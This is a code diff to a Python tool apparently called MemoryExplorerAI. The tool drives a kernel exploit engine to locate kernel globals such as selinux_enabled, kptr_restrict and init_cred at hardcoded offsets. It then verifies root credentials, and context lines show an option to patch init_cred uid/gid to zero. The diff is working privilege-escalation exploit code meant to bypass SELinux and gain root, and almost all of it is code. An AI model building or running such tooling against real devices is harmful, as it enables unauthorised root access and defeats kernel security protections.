@@ -118,7 +118,18 @@ class MemoryExplorerAI:
             0x3b3ace8, 0x3b84ce8, 0x3cf4ce8, 0x3d34ce8, 0x3d44ce8,
             0x3df4ce8, 0x3e34ce8, 0x3e54ce8, 0x3eb4ce8, 0x3f04ce8,
         ]
+        # Other interesting kernel globals to try
+        self.interesting_offsets = {
+            "selinux_enabled":  [0x02cab000, 0x2f74d00, 0x32aad00],
+            "kptr_restrict":    [0x0284e000, 0x0252b000, 0x027fa000],
+            "apparmor_enabled": [0x02d68000, 0x2c5b000, 0x2d37000],
+        }
+        # init_cred — primary offset from v6.c, plus alternates
         self.init_cred_offset = 0x018f9038
+        self.init_cred_alternates = [
+            0x018f9038, 0x018a5038, 0x01973038, 0x01939038,
+            0x019f1038, 0x01a3b038, 0x01a6d038, 0x01a9f038,
+        ]
         self.kernel_base = None
         self.selinux_va  = None
         self.cred_va     = None
@@ -621,60 +632,104 @@ class MemoryExplorerAI:
         return None
 
     def _probe_selinux(self, kbase):
-        """Strict SELinux enforcing probe: try known offsets, verify via engine
-        'selinux' command (3 reads, must be stable 0 or 1)."""
+        """Strict SELinux enforcing probe: try ALL known offsets, score each by
+        non-zero data, pick the one with most non-zero bytes (real kernel page).
+        Returns (va, val) or None."""
+        best = None  # (score, va, val, nz, ptr)
         for off in self.selinux_offset_candidates:
             va = kbase + off
             if not self._engine_write(f"selinux {hex(va)}\n".encode()):
                 continue
-            deadline = time.time() + 5
-            while time.time() < deadline:
-                line = self._readline_timeout(timeout=1.0)
-                if not line:
-                    continue
-                if line.startswith("SELINUX:OK:") and ":stable" in line:
+            line = self._wait_for_engine_reply("SELINUX:", timeout=5.0)
+            if not line:
+                continue
+            # Parse: SELINUX:OK:<va>:<val>:stable:nz=<n>:ptr=<p>
+            if "SELINUX:OK:" in line:
+                try:
                     parts = line.split(":")
-                    # SELINUX:OK:<va>:<val>:stable
                     val = int(parts[3])
-                    return (va, val)
-                if line.startswith("SELINUX:"):
-                    # READ_FAIL / UNSTABLE / FAIL — try next offset
-                    break
-                if line is None:
-                    break
+                    nz = int(parts[5].split("=")[1])
+                    ptr = int(parts[6].split("=")[1])
+                    # Score: 100*ptr + nz (prefer pages with kernel pointers)
+                    score = 1000 * ptr + nz
+                    if best is None or score > best[0]:
+                        best = (score, va, val, nz, ptr)
+                except Exception:
+                    pass
+            elif "SELINUX:WEAK:" in line:
+                try:
+                    parts = line.split(":")
+                    val = int(parts[3])
+                    nz = int(parts[5].split("=")[1])
+                    ptr = int(parts[6].split("=")[1])
+                    # Weak: lower priority than OK
+                    score = 500 * ptr + nz - 100  # penalty
+                    if best is None or score > best[0]:
+                        best = (score, va, val, nz, ptr)
+                except Exception:
+                    pass
+            # ZERO_PAGE / UNSTABLE / FAIL: skip
+        if best is None:
+            return None
+        _, va, val, nz, ptr = best
+        return (va, val)
+
+    def _wait_for_engine_reply(self, prefix, timeout=2.0):
+        """Read engine stdout until a line starts with `prefix` (or timeout)."""
+        deadline = time.time() + timeout
+        while time.time() < deadline:
+            line = self._readline_timeout(timeout=0.5)
+            if line is None:
+                return None
+            if not line:
+                continue
+            if line.startswith(prefix):
+                return line
         return None
 
     def _verify_init_cred(self, va):
-        """Use engine 'cred' command to verify init_cred at va."""
+        """Use engine 'cred' command to verify init_cred at va.
+        Returns 'root', 'valid', or None."""
         if not self._engine_write(f"cred {hex(va)}\n".encode()):
             return None
-        deadline = time.time() + 5
-        while time.time() < deadline:
-            line = self._readline_timeout(timeout=1.0)
-            if not line:
-                continue
-            if line.startswith("CRED:OK:") and ":root" in line:
-                return "root"
-            if line.startswith("CRED:OK:"):
-                return "valid"
-            if line.startswith("CRED:"):
-                return None
-            if line is None:
-                return None
+        line = self._wait_for_engine_reply("CRED:", timeout=5.0)
+        if not line:
+            return None
+        if "CRED:OK:" in line and ":root" in line:
+            return "root"
+        if "CRED:OK:" in line:
+            return "valid"
         return None
 
     def _find_init_cred(self, kbase):
-        """init_cred is at kbase + INIT_CRED_OFFSET. Returns VA if verified, else kbase+offset."""
-        va = kbase + self.init_cred_offset
-        result = self._verify_init_cred(va)
-        if result is not None:
-            return va
-        # Try alternate offsets
-        for off in (0x018f9038, 0x018a5038, 0x01973038, 0x01939038):
-            alt = kbase + off
-            if self._verify_init_cred(alt) is not None:
-                return alt
+        """init_cred at kbase + INIT_CRED_OFFSET. Returns VA if verified, else None."""
+        for off in self.init_cred_alternates:
+            va = kbase + off
+            if self._verify_init_cred(va) is not None:
+                return va
         return None
+
+    def _probe_interesting(self, kbase):
+        """Try other interesting kernel globals (selinux_enabled, kptr_restrict, etc.)."""
+        found = []
+        for name, offsets in self.interesting_offsets.items():
+            for off in offsets:
+                va = kbase + off
+                data = self.read_page(va)
+                if not data or len(data) < 8:
+                    continue
+                val = int.from_bytes(data[0:4], "little")
+                # These are typically 0, 1, or 2
+                if val in (0, 1, 2):
+                    nonzero = sum(1 for b in data if b != 0)
+                    if nonzero >= 32:  # real kernel data page
+                        found.append({
+                            "name": name,
+                            "va": va,
+                            "val": val,
+                            "nonzero": nonzero,
+                        })
+        return found
 
     def get_ram_usage(self):
         try:
@@ -826,8 +881,18 @@ class MemoryExplorerAI:
 
                 sel_str = f"0x{sel[0]:x}" if sel else "N/A"
                 ic_str  = f"0x{ic:x}" if ic else "N/A"
+                self.live["last_msg"] = "AUTO: probing other kernel globals (selinux_enabled, kptr_restrict)…"
+                extra = self._probe_interesting(kbase)
+                for f in extra:
+                    self._add_found(
+                        va=hex(f["va"]),
+                        type="Kernel Global",
+                        desc=f"{f['name']}={f['val']} (nz={f['nonzero']})",
+                        confidence=80,
+                    )
                 self.live["last_msg"] = (
-                    f"AUTO DONE: kbase=0x{kbase:x} selinux={sel_str} cred={ic_str}")
+                    f"AUTO DONE: kbase=0x{kbase:x} selinux={sel_str} "
+                    f"cred={ic_str} extras={len(extra)}")
             except Exception as e:
                 self.live["last_msg"] = f"Exploit error: {e}"
                 self.log_event("exploit_error", {"err": str(e)})
@@ -1288,9 +1353,11 @@ class MemoryExplorerAI:
                          f"[{C.GRN}Enter{C.RST}] Back\n")
         sys.stdout.flush()
         try:
-            choice = self.input_cmd().lower()
+            choice = self.input_cmd().strip().lower()
         except (EOFError, KeyboardInterrupt):
             return
+        if not choice or choice in ("enter", "b", "back", "q"):
+            return  # Enter (empty) goes back to TUI
         if choice == "k":
             # Patch init_cred uid/gid to 0 (root) at this VA
             try:
